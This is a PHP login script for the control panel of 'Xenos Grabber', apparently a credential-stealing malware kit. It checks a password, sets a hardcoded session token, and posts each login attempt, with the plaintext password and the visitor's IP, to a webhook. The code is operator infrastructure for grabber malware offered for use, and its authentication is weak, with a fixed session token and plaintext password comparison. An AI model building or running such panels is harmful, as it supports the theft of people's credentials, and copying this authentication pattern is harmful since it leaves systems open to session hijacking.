<?php
    require_once('../Inc/fonctions.php');
    $webhook = "WEBHOOK FOR LOGS";

    if(isset($_POST['password']) && !empty($_POST['password'])) {
        if($_POST['password'] == "YOUR_SECRET_PASSWORD") {
            $_SESSION['token'] = "n4wh0bhflr5z0v5s5l5q5lk1u1u3jm6eg3162atmey";
            SendToWebhook($webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => "> __Tentative de connexion à Xenos Réussi:__\n```Password: " . $_POST['password'] . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"]]]]));
            header('Location: ../'); die();
        } else {
            SendToWebhook($webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => "> __Tentative de connexion à Xenos Echoué:__\n```Password: " . $_POST['password'] . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"]]]]));
            header('Location: ../login.php?error=invalid'); die();
        }
    } else {
        SendToWebhook($webhook, json_encode(["username" => "Xenos Grabber","avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif","embeds" => [["description" => "> __Tentative de connexion à Xenos Echoué:__\n```Password: " . $_POST['password'] . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Xenos Grabber - https://github.com/KanekiWeb","icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"]]]]));
        header('Location: ../login.php?error=invalid'); die();
    }

?>
